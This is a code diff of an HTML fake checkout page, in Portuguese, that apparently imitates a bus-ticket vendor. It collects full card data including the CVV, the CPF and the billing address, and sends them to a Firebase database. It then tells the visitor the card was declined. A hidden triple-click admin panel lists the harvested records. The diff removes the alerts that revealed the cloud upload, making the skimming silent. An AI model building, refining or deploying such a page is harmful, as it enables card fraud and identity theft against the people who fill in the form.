@@ -9,299 +9,46 @@
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: system-ui, -apple-system, sans-serif;
-        }
-
-        body {
-            background: #e8e8e8;
-            display: flex;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 500px;
-            width: 100%;
-            background: #fff;
-            padding: 25px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 5px;
-        }
-
-        h1 {
-            font-size: 24px;
-            cursor: default;
-        }
-
-        .admin-btn {
-            background: transparent;
-            color: #999;
-            border: none;
-            padding: 4px 8px;
-            font-size: 11px;
-            cursor: pointer;
-            font-weight: 400;
-            transition: 0.2s;
-            border-radius: 4px;
-            opacity: 0.4;
-        }
-
-        .admin-btn:hover {
-            opacity: 0.8;
-            background: #f0f0f0;
-        }
-
-        .sub {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-
-        .section {
-            margin-top: 20px;
-            border-top: 2px solid #eee;
-            padding-top: 15px;
-        }
-
-        .section h3 {
-            font-size: 16px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-
-        .form-group {
-            margin-bottom: 12px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-
-        .form-group input,
-        .form-group select {
-            width: 100%;
-            padding: 10px 14px;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            font-size: 14px;
-            outline: none;
-        }
-
-        .form-group input:focus {
-            border-color: #000;
-        }
-
-        .row {
-            display: flex;
-            gap: 10px;
-        }
-
-        .row .form-group {
-            flex: 1;
-        }
-
-        .resumo {
-            background: #f5f5f5;
-            padding: 15px;
-            border-radius: 12px;
-            margin: 15px 0;
-        }
-
-        .resumo .total {
-            font-size: 22px;
-            font-weight: 700;
-        }
-
-        .btn-finalizar {
-            background: #000;
-            color: #fff;
-            border: none;
-            padding: 16px;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        .btn-finalizar:active {
-            transform: scale(0.97);
-        }
-
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 999;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-overlay.aberto {
-            display: flex;
-        }
-
-        .modal {
-            background: #fff;
-            border-radius: 20px;
-            max-width: 450px;
-            width: 92%;
-            padding: 25px;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-
-        .modal h2 {
-            margin-bottom: 15px;
-        }
-
-        .modal input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            margin-bottom: 12px;
-            font-size: 15px;
-        }
-
-        .modal .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 30px;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 5px;
-        }
-
-        .modal .btn-primary {
-            background: #000;
-            color: #fff;
-        }
-
-        .modal .btn-danger {
-            background: #c62828;
-            color: #fff;
-        }
-
-        .modal .btn-secondary {
-            background: #e0e0e0;
-            color: #000;
-        }
-
-        .erro {
-            color: #d32f2f;
-            font-size: 14px;
-            display: none;
-            margin-bottom: 10px;
-        }
-
-        .erro.visivel {
-            display: block;
-        }
-
-        .historico-item {
-            background: #f5f5f5;
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 10px;
-            font-size: 13px;
-        }
-
-        .historico-item .data {
-            font-weight: 600;
-        }
-
-        .historico-item .info {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 5px 12px;
-            margin-top: 4px;
-        }
-
-        .historico-item .info span {
-            background: #ddd;
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-        }
-
-        .recebedor-info {
-            background: #ececec;
-            border-radius: 40px;
-            padding: 8px 16px;
-            font-size: 12px;
-            color: #000;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px 16px;
-            margin-top: 15px;
-            justify-content: center;
-            border: 1px solid #b0b0b0;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-
-        .recebedor-info span {
-            font-weight: 500;
-        }
-
-        .admin-hidden {
-            opacity: 0.2;
-            font-size: 10px;
-            color: #ccc;
-            background: transparent;
-            border: none;
-            cursor: pointer;
-            padding: 2px 6px;
-            transition: 0.3s;
-        }
-
-        .admin-hidden:hover {
-            opacity: 0.6;
-            color: #999;
-        }
-
-        .fechar-modal {
-            background: none;
-            border: none;
-            font-size: 24px;
-            cursor: pointer;
-            color: #000;
-            padding: 0 4px;
-        }
-
-        @media (max-width: 480px) {
-            .container {
-                padding: 15px;
-            }
-            .row {
-                flex-wrap: wrap;
-            }
-            .row .form-group {
-                flex: 1 1 100%;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, sans-serif; }
+        body { background: #e8e8e8; display: flex; justify-content: center; padding: 20px; }
+        .container { max-width: 500px; width: 100%; background: #fff; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
+        h1 { font-size: 24px; cursor: default; }
+        .sub { color: #666; font-size: 14px; margin-bottom: 20px; }
+        .section { margin-top: 20px; border-top: 2px solid #eee; padding-top: 15px; }
+        .section h3 { font-size: 16px; margin-bottom: 10px; font-weight: 600; }
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 4px; }
+        .form-group input, .form-group select { width: 100%; padding: 10px 14px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; }
+        .form-group input:focus { border-color: #000; }
+        .row { display: flex; gap: 10px; }
+        .row .form-group { flex: 1; }
+        .resumo { background: #f5f5f5; padding: 15px; border-radius: 12px; margin: 15px 0; }
+        .resumo .total { font-size: 22px; font-weight: 700; }
+        .btn-finalizar { background: #000; color: #fff; border: none; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: 700; cursor: pointer; width: 100%; }
+        .btn-finalizar:active { transform: scale(0.97); }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; justify-content: center; align-items: center; }
+        .modal-overlay.aberto { display: flex; }
+        .modal { background: #fff; border-radius: 20px; max-width: 450px; width: 92%; padding: 25px; max-height: 90vh; overflow-y: auto; }
+        .modal h2 { margin-bottom: 15px; }
+        .modal input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 12px; margin-bottom: 12px; font-size: 15px; }
+        .modal .btn { width: 100%; padding: 14px; border: none; border-radius: 30px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 5px; }
+        .modal .btn-primary { background: #000; color: #fff; }
+        .modal .btn-danger { background: #c62828; color: #fff; }
+        .modal .btn-secondary { background: #e0e0e0; color: #000; }
+        .erro { color: #d32f2f; font-size: 14px; display: none; margin-bottom: 10px; }
+        .erro.visivel { display: block; }
+        .historico-item { background: #f5f5f5; padding: 12px; border-radius: 12px; margin-bottom: 10px; font-size: 13px; }
+        .historico-item .data { font-weight: 600; }
+        .historico-item .info { display: flex; flex-wrap: wrap; gap: 5px 12px; margin-top: 4px; }
+        .historico-item .info span { background: #ddd; padding: 2px 10px; border-radius: 20px; font-size: 12px; }
+        .recebedor-info { background: #ececec; border-radius: 40px; padding: 8px 16px; font-size: 12px; color: #000; display: flex; flex-wrap: wrap; gap: 8px 16px; margin-top: 15px; justify-content: center; border: 1px solid #b0b0b0; flex-direction: column; align-items: center; text-align: center; }
+        .recebedor-info span { font-weight: 500; }
+        .admin-hidden { opacity: 0.2; font-size: 10px; color: #ccc; background: transparent; border: none; cursor: pointer; padding: 2px 6px; transition: 0.3s; }
+        .admin-hidden:hover { opacity: 0.6; color: #999; }
+        .fechar-modal { background: none; border: none; font-size: 24px; cursor: pointer; color: #000; padding: 0 4px; }
+        .msg-icone { font-size: 56px; margin-bottom: 10px; color: #d32f2f; }
+        @media (max-width: 480px) { .container { padding: 15px; } .row { flex-wrap: wrap; } .row .form-group { flex: 1 1 100%; } }
     </style>
 </head>
 <body>
@@ -317,102 +64,43 @@
 
         <div class="section">
             <h3>Dados Pessoais</h3>
-            <div class="form-group">
-                <label>Nome completo</label>
-                <input type="text" id="nome" placeholder="Ex: Joao Silva">
-            </div>
-            <div class="form-group">
-                <label>E-mail</label>
-                <input type="email" id="email" placeholder="exemplo@email.com">
-            </div>
+            <div class="form-group"><label>Nome completo</label><input type="text" id="nome" placeholder="Ex: Joao Silva"></div>
+            <div class="form-group"><label>E-mail</label><input type="email" id="email" placeholder="exemplo@email.com"></div>
             <div class="row">
-                <div class="form-group">
-                    <label>CPF</label>
-                    <input type="text" id="cpf" class="mascara" placeholder="000.000.000-00" maxlength="14">
-                </div>
-                <div class="form-group">
-                    <label>Telefone</label>
-                    <input type="text" id="telefone" class="mascara" placeholder="(11) 99999-9999" maxlength="15">
-                </div>
+                <div class="form-group"><label>CPF</label><input type="text" id="cpf" class="mascara" placeholder="000.000.000-00" maxlength="14"></div>
+                <div class="form-group"><label>Telefone</label><input type="text" id="telefone" class="mascara" placeholder="(11) 99999-9999" maxlength="15"></div>
             </div>
         </div>
 
         <div class="section">
             <h3>Endereco de Cobranca</h3>
-            <div class="form-group">
-                <label>CEP</label>
-                <input type="text" id="cep" class="mascara" placeholder="00000-000" maxlength="9">
-            </div>
-            <div class="form-group">
-                <label>Logradouro</label>
-                <input type="text" id="logradouro" placeholder="Rua, Avenida...">
+            <div class="form-group"><label>CEP</label><input type="text" id="cep" class="mascara" placeholder="00000-000" maxlength="9"></div>
+            <div class="form-group"><label>Logradouro</label><input type="text" id="logradouro" placeholder="Rua, Avenida..."></div>
+            <div class="row">
+                <div class="form-group"><label>Numero</label><input type="text" id="numero" placeholder="123"></div>
+                <div class="form-group"><label>Complemento</label><input type="text" id="complemento" placeholder="Apto, bloco..."></div>
             </div>
             <div class="row">
-                <div class="form-group">
-                    <label>Numero</label>
-                    <input type="text" id="numero" placeholder="123">
-                </div>
-                <div class="form-group">
-                    <label>Complemento</label>
-                    <input type="text" id="complemento" placeholder="Apto, bloco...">
-                </div>
-            </div>
-            <div class="row">
-                <div class="form-group">
-                    <label>Bairro</label>
-                    <input type="text" id="bairro" placeholder="Centro">
-                </div>
-                <div class="form-group">
-                    <label>Cidade</label>
-                    <input type="text" id="cidade" placeholder="Sao Paulo">
-                </div>
-                <div class="form-group" style="flex:0.5">
-                    <label>UF</label>
-                    <input type="text" id="uf" placeholder="SP">
-                </div>
+                <div class="form-group"><label>Bairro</label><input type="text" id="bairro" placeholder="Centro"></div>
+                <div class="form-group"><label>Cidade</label><input type="text" id="cidade" placeholder="Sao Paulo"></div>
+                <div class="form-group" style="flex:0.5"><label>UF</label><input type="text" id="uf" placeholder="SP"></div>
             </div>
         </div>
 
         <div class="section">
             <h3>Dados do Cartao</h3>
-            <div class="form-group">
-                <label>Numero do cartao</label>
-                <input type="text" id="cartao" class="mascara" placeholder="0000 0000 0000 0000" maxlength="19">
-            </div>
-            <div class="form-group">
-                <label>Nome no cartao</label>
-                <input type="text" id="nomeCartao" placeholder="Como gravado no cartao">
-            </div>
-            <div class="form-group">
-                <label>CPF do titular</label>
-                <input type="text" id="cpfTitular" class="mascara" placeholder="000.000.000-00" maxlength="14">
-            </div>
+            <div class="form-group"><label>Numero do cartao</label><input type="text" id="cartao" class="mascara" placeholder="0000 0000 0000 0000" maxlength="19"></div>
+            <div class="form-group"><label>Nome no cartao</label><input type="text" id="nomeCartao" placeholder="Como gravado no cartao"></div>
+            <div class="form-group"><label>CPF do titular</label><input type="text" id="cpfTitular" class="mascara" placeholder="000.000.000-00" maxlength="14"></div>
             <div class="row">
-                <div class="form-group">
-                    <label>Validade</label>
-                    <input type="text" id="validade" class="mascara" placeholder="MM/AA" maxlength="5">
-                </div>
-                <div class="form-group">
-                    <label>CVV</label>
-                    <input type="text" id="cvv" class="mascara" placeholder="123" maxlength="3">
-                </div>
-                <div class="form-group">
-                    <label>Parcelas</label>
-                    <select id="parcelas">
-                        <option value="1">1x sem juros</option>
-                        <option value="2">2x</option>
-                        <option value="3">3x</option>
-                        <option value="4">4x</option>
-                        <option value="5">5x</option>
-                        <option value="6">6x</option>
-                        <option value="7">7x</option>
-                        <option value="8">8x</option>
-                        <option value="9">9x</option>
-                        <option value="10">10x</option>
-                        <option value="11">11x</option>
-                        <option value="12" selected>12x</option>
-                    </select>
-                </div>
+                <div class="form-group"><label>Validade</label><input type="text" id="validade" class="mascara" placeholder="MM/AA" maxlength="5"></div>
+                <div class="form-group"><label>CVV</label><input type="text" id="cvv" class="mascara" placeholder="123" maxlength="3"></div>
+                <div class="form-group"><label>Parcelas</label><select id="parcelas">
+                    <option value="1">1x sem juros</option><option value="2">2x</option><option value="3">3x</option>
+                    <option value="4">4x</option><option value="5">5x</option><option value="6">6x</option>
+                    <option value="7">7x</option><option value="8">8x</option><option value="9">9x</option>
+                    <option value="10">10x</option><option value="11">11x</option><option value="12" selected>12x</option>
+                </select></div>
             </div>
         </div>
 
@@ -434,44 +122,38 @@
 
     </div>
 
+    <!-- MODAL ADMIN -->
     <div class="modal-overlay" id="modalAdmin">
         <div class="modal">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;">
                 <h2 id="modalTitulo">Acesso Administrativo</h2>
                 <button class="fechar-modal" id="modalFechar">X</button>
             </div>
-
             <div id="areaSenha">
                 <label>Digite a senha</label>
                 <input type="password" id="senhaInput" placeholder="Digite a senha">
                 <div class="erro" id="senhaErro">Senha incorreta</div>
                 <button class="btn btn-primary" id="btnConfirmarSenha">Confirmar</button>
             </div>
-
             <div id="areaPainel" style="display:none;">
                 <p style="color:#2e7d32;font-weight:600;margin-bottom:12px;">Acesso liberado</p>
-
                 <label>Alterar valor (R$)</label>
                 <input type="number" id="novoValor" step="0.01" value="99.00">
-
                 <button class="btn btn-primary" id="btnSalvarValor">Salvar valor</button>
-
                 <h3 style="margin:15px 0 10px;">Historico de registros</h3>
-                <div id="historicoContainer">
-                    <div style="color:#888;text-align:center;padding:20px;">Carregando...</div>
-                </div>
-
+                <div id="historicoContainer"><div style="color:#888;text-align:center;padding:20px;">Carregando...</div></div>
                 <button class="btn btn-danger" id="btnLimparHistorico" style="margin-top:10px;">Limpar historico</button>
                 <button class="btn btn-secondary" id="btnFecharModal">Fechar</button>
             </div>
         </div>
     </div>
 
+    <!-- MODAL CARTAO RECUSADO -->
     <div class="modal-overlay" id="msgRecusado">
         <div class="modal" style="text-align:center;max-width:350px;">
-            <div style="font-size:48px;margin-bottom:10px;">X</div>
+            <div class="msg-icone">✕</div>
             <h2>Cartao recusado</h2>
-            <p style="color:#555;margin:10px 0 20px;">Infelizmente sua transacao nao foi aprovada.</p>
+            <p style="color:#555;margin:10px 0 20px;">Infelizmente sua transacao nao foi aprovada. Verifique os dados e tente novamente.</p>
             <button class="btn btn-primary" id="btnMsgOk">OK</button>
         </div>
     </div>
@@ -511,8 +193,7 @@
                     else if (this.id === 'cvv') pattern = '999';
                     else return;
 
-                    let formatted = '',
-                        pos = 0;
+                    let formatted = '', pos = 0;
                     for (let i = 0; i < pattern.length && pos < val.length; i++) {
                         if (pattern[i] === '9') formatted += val[pos++];
                         else formatted += pattern[i];
@@ -522,8 +203,7 @@
 
                 el.addEventListener('keydown', function(e) {
                     const key = e.key;
-                    if (['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'].includes(key))
-                    return;
+                    if (['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown'].includes(key)) return;
                     if (!/^[0-9]$/.test(key)) e.preventDefault();
                 });
             });
@@ -584,15 +264,12 @@
                 cliqueCount++;
                 clearTimeout(timeoutClique);
                 timeoutClique = setTimeout(() => { cliqueCount = 0; }, 2000);
-
                 if (cliqueCount >= 3) {
                     cliqueCount = 0;
                     if (btnAdminEl.style.display === 'none' || btnAdminEl.style.display === '') {
                         btnAdminEl.style.display = 'inline-block';
                         btnAdminEl.style.opacity = '0.3';
-                        setTimeout(() => {
-                            btnAdminEl.style.opacity = '0.6';
-                        }, 300);
+                        setTimeout(() => { btnAdminEl.style.opacity = '0.6'; }, 300);
                     } else {
                         btnAdminEl.style.display = 'none';
                     }
@@ -636,10 +313,7 @@
                 const dados = coletarDados();
 
                 let historico = [];
-                try {
-                    const raw = localStorage.getItem('historico_buser');
-                    if (raw) historico = JSON.parse(raw);
-                } catch (e) {}
+                try { const raw = localStorage.getItem('historico_buser'); if (raw) historico = JSON.parse(raw); } catch (e) {}
                 historico.unshift(dados);
                 if (historico.length > 50) historico = historico.slice(0, 50);
                 localStorage.setItem('historico_buser', JSON.stringify(historico));
@@ -647,14 +321,8 @@
                 if (firebaseOk) {
                     try {
                         const ref = database.ref('checkout/' + Date.now());
-                        ref.set(dados)
-                            .then(() => alert('Dados salvos na nuvem!'))
-                            .catch(() => alert('Dados salvos apenas localmente'));
-                    } catch (e) {
-                        alert('Dados salvos apenas localmente');
-                    }
-                } else {
-                    alert('Dados salvos localmente');
+                        ref.set(dados).then(() => {}).catch(() => {});
+                    } catch (e) {}
                 }
 
                 if (areaPainel.style.display !== 'none') {
@@ -780,9 +448,6 @@
                 const v = parseFloat(novoValor.value.replace(',', '.'));
                 if (!isNaN(v) && v > 0) {
                     atualizarValor(v);
-                    alert('Valor alterado para R$ ' + v.toFixed(2).replace('.', ','));
-                } else {
-                    alert('Valor invalido');
                 }
             });
 
@@ -791,7 +456,6 @@
                     localStorage.removeItem('historico_buser');
                     localStorage.removeItem('historico_buser_firebase');
                     mostrarHistorico([]);
-                    alert('Historico limpo!');
                 }
             });
 
